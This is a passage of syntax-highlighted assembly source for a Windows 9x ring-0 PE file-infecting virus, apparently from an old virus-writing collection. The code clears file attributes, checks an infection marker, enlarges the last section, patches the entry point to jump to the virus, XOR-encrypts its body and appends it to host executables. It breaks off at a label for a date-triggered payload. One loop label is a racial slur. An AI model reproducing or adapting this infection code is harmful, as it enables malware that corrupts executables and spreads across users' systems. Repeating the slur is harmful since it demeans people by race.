        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">notsofunny</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; Get File Attributes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">notsofunny</span><span class="sc0">
 
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; Save'em</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Clear attributes</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">stillnotsofunny</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; Open file a'la DOS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; EDX = 1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; EBX = 2</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">stillnotsofunny</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; hehehe... as we did in DOS :)</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inf_delta</span><span class="sc0">                       </span><span class="sc1">; Plurg... Delta offset!</span><span class="sc0">
</span><span class="sc5">inf_delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inf_delta</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc0">                 </span><span class="sc1">; Read the dword that marks</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; us the beginning of PE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03Ch</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pehead</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; There goez the PE header offzet</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pehead</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Now read 1024 bytes of PE </span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; header. I think it's enough.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">            </span><span class="sc1">; Is it PE?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">muthafucka</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4Ch</span><span class="sc4">],</span><span class="sc3">"HSOP"</span><span class="sc0">      </span><span class="sc1">; Was it already infected?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">muthafucka</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4Ch</span><span class="sc4">],</span><span class="sc3">"HSOP"</span><span class="sc0">      </span><span class="sc1">; Damned poshes</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                         </span><span class="sc1">; Save in EDI the PE offset</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ PE Infection routinez                                                   ³</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Get last section of header</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">78h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">74h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; ESI = last section header</span><span class="sc0">
                                                </span><span class="sc1">; EDI = PE header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EDX = SizeOfRawData</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; EAX = SizeOfRawData</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EDX = New EIP</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Where append virus</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Save it</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Save actual SizeOfRawData</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">                  </span><span class="sc1">; EAX = VirusSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = VirusSize+SizeOfRawData</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; ECX = Alignment</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc9">align</span><span class="sc0">                           </span><span class="sc1">; Align it!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; EAX = New SizeOfRawData &amp;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; New VirtualSize</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = New SizeOfCode</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Put it!</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; EAX = Old SizeOfRawData</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; ECX = New SizeOfRawData</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Get the difference (size to</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; append) and save it</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Host's EIP</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">base</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Save it </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newEIP</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">      </span><span class="sc1">; And where virus begins</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Contruct relative offset</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">sjumpy</span><span class="sc0">                      </span><span class="sc1">; for make the jump</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">jumpy</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)],</span><span class="sc8">edx</span><span class="sc0">   </span><span class="sc1">; Store the address</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc5">section_flags</span><span class="sc0">         </span><span class="sc1">; Update section's flagz</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0F8h</span><span class="sc4">-</span><span class="sc2">28h</span><span class="sc0">                    </span><span class="sc1">; Pointer to 1st section-28h</span><span class="sc0">
</span><span class="sc5">nigger</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                         </span><span class="sc1">; Ptr to section name ;)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Put in EDX the original EIP</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Remove the VirtualAddress</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Is EIP pointing to this sec?</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">nigger</span><span class="sc0">                          </span><span class="sc1">; If not, loop again</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc5">section_flags</span><span class="sc0">         </span><span class="sc1">; Put sum attributes</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; Read first bytes beginning</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_READFILE</span><span class="sc0">                 </span><span class="sc1">; from the EIP, the first</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; bytes that are executed </span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">oldjmpy</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; by the program, and save'em</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">sjumpy</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">                </span><span class="sc1">; Write it some shit to pass</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">sjumpy</span><span class="sc0">                      </span><span class="sc1">; the control to the virus</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; See jumpyx label for more</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jumpyx</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; details ;)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ Append, and close file                                                  ³</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">                </span><span class="sc1">; Write the modified header </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">                        </span><span class="sc1">; to the file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">pehead</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">header</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">virus_size</span><span class="sc0">                      </span><span class="sc1">; Allocate the virus size</span><span class="sc0">
</span><span class="sc5">@@6</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_GetHeap</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">temp_addr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VxDFix</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; Copy virus to temporal </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; heap chunk</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc5">rdtcs</span><span class="sc0">                                   </span><span class="sc1">; Get a random number</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">rva_key</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">; Save encrypt key in virus</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc4">-</span><span class="sc5">encrypt_size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">encrypt_size</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">el00p</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; Encrypt virus</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">el00p</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; ESI = Ptr to virus_start</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; ECX = Size (rounded) to append</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; EDX = Ptr where append</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">                </span><span class="sc1">; Append virus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">temp_addr</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@7</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_RetHeap</span><span class="sc0">                  </span><span class="sc1">; Free memory used by 2nd copy</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">beepy</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">muthafucka</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">                </span><span class="sc1">; Close file</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

</span><span class="sc5">stillnotsofunny</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; Restore its attributes</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">R0_FileIO</span><span class="sc0">

</span><span class="sc5">notsofunny</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">R0_FileIO</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; Optimize for the table</span><span class="sc0">
</span><span class="sc5">@@4</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; On input:</span><span class="sc0">
</span><span class="sc1">;       EAX = Number to align</span><span class="sc0">
</span><span class="sc1">;       ECX = Alignment factor</span><span class="sc0">
</span><span class="sc1">; On output:</span><span class="sc0">
</span><span class="sc1">;       EAX = Aligned number</span><span class="sc0">

</span><span class="sc9">align</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ Graphical payload if date is 26th of October                            ³</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

</span><span class="sc5">payload</span><span class="sc4">:</span><span class="sc0">
